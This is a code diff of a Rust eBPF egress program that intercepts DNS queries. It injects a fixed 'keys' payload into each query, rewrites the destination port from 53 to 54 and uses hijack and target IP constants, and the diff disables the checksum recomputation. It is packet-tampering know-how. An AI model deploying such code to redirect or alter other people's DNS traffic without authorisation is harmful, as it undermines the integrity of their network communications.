@@ -16,7 +16,7 @@ use network_types::{
 };
 
 use crate::common::{
-    calculate_udp_checksum, inject_udp_payload, load_bytes, log_csums, update_addr,
+    calculate_udp_checksum, inject_keys_payload, load_bytes, log_csums, store_bytes, update_addr,
     update_ip_hdr_tot_len, update_port, update_udp_hdr_len, UpdateType, BPF_ADJ_ROOM_NET,
     DNS_QUERY_OFFSET, HIJACK_IP, TARGET_IP, UDP_CSUM_OFFSET, UDP_DEST_PORT_OFFSET, UDP_OFFSET,
 };
@@ -67,7 +67,6 @@ fn tc_process_egress(ctx: &mut TcContext) -> Result<i32, ()> {
                     //     .map_err(|_| ())?; //will only load tot_len - DNS_QUERY_OFFSET bytes from skbuf to buf as it takes min(tot_len-DNS_QUERY_OFFSET, dst.len())
 
                     let mut fixed_size_added_keys = [0u8; KEYS_PAYLOAD_LEN];
-
                     fixed_size_added_keys.copy_from_slice("toto".as_bytes());
 
                     let keys_as_u32: u32 = ((fixed_size_added_keys[0] as u32) << 24)
@@ -84,6 +83,7 @@ fn tc_process_egress(ctx: &mut TcContext) -> Result<i32, ()> {
                     )?;
 
                     //make room
+                    info!(ctx, "adjust room");
                     ctx.skb
                         .adjust_room(KEYS_PAYLOAD_LEN as i32, BPF_ADJ_ROOM_NET, 0)
                         .map_err(|_| {
@@ -94,23 +94,23 @@ fn tc_process_egress(ctx: &mut TcContext) -> Result<i32, ()> {
                     ctx.store(UDP_OFFSET, &udp_hdr, 0).map_err(|_| {
                         error!(ctx, "error shifting udp header ");
                     })?;
+
                     update_udp_hdr_len(
                         ctx,
                         &(u16::from_be(udp_hdr.len) + KEYS_PAYLOAD_LEN as u16).to_be(),
                     )?;
-                    update_port(ctx, &54u16.to_be(), UpdateType::Dst)?;
+
+                    update_port(ctx, &53u16.to_be(), &54u16.to_be(), UpdateType::Dst)?;
 
                     //move dns payload
                     let buf = unsafe {
                         let ptr = DNS_BUFFER.get_ptr(0).ok_or(())?;
                         &(*ptr).buf
                     };
+                    info!(ctx, "injecting dns payload  @{}  ", DNS_QUERY_OFFSET);
+                    store_bytes(ctx, DNS_QUERY_OFFSET, buf, 0).map_err(|_| ())?;
 
-                    ctx.store(DNS_QUERY_OFFSET, &buf, 0).map_err(|_| {
-                        error!(ctx, "error shifting dns payload ");
-                    })?;
-
-                    inject_udp_payload(
+                    inject_keys_payload(
                         ctx,
                         DNS_QUERY_OFFSET + dns_payload_len,
                         &keys_as_u32.to_be(),
@@ -118,29 +118,32 @@ fn tc_process_egress(ctx: &mut TcContext) -> Result<i32, ()> {
 
                     //recompute checksum layer 4
                     //set current csum to 0
-                    ctx.store(UDP_CSUM_OFFSET, &0, 2).map_err(|_| {
-                        error!(ctx, "error zeroing L4 csum");
-                    })?;
+                    // ctx.store(UDP_CSUM_OFFSET, &0u16, 2).map_err(|_| {
+                    //     error!(ctx, "error zeroing L4 csum");
+                    // })?;
 
-                    let udp_hdr_bytes = &ctx.load::<[u8; 8]>(UDP_OFFSET).map_err(|_| ())?;
-                    let buf = unsafe {
-                        let ptr = DNS_BUFFER.get_ptr_mut(0).ok_or(())?;
-                        &mut (*ptr).buf
-                    };
-                    load_bytes(ctx, DNS_QUERY_OFFSET, buf).map_err(|_| ())?;
-                    let mask = DNS_PAYLOAD_MAX_LEN + KEYS_PAYLOAD_LEN;
-                    let new_cs = calculate_udp_checksum(
-                        u32::from_be(header.src_addr),
-                        target_ip,
-                        udp_hdr_bytes,
-                        &buf[..mask],
-                    );
-                    //
-                    info!(ctx, "NEW CS: {}", new_cs);
-                    ctx.store(UDP_CSUM_OFFSET, &new_cs.to_be(), 2)
-                        .map_err(|_| {
-                            error!(ctx, "error reseting L4 csum");
-                        })?;
+                    // let udp_hdr_bytes = &ctx.load::<[u8; 8]>(UDP_OFFSET).map_err(|_| ())?;
+                    // let buf = unsafe {
+                    //     let ptr = DNS_BUFFER.get_ptr_mut(0).ok_or(())?;
+                    //     &mut (*ptr).buf
+                    // };
+                    // load_bytes(ctx, DNS_QUERY_OFFSET, buf).map_err(|_| ())?;
+
+                    // let new_cs = calculate_udp_checksum(
+                    //     ctx,
+                    //     u32::from_be(header.src_addr),
+                    //     u32::from_be(target_ip),
+                    //     udp_hdr_bytes,
+                    //     buf,
+                    //     DNS_PAYLOAD_MAX_LEN + KEYS_PAYLOAD_LEN,
+                    //     dns_payload_len + KEYS_PAYLOAD_LEN,
+                    // );
+
+                    // info!(ctx, "NEW CS: {}", new_cs);
+                    // ctx.store(UDP_CSUM_OFFSET, &new_cs.to_be(), 2)
+                    //     .map_err(|_| {
+                    //         error!(ctx, "error reseting L4 csum");
+                    //     })?;
 
                     unsafe {
                         bpf_set_hash_invalid(ctx.skb.skb);
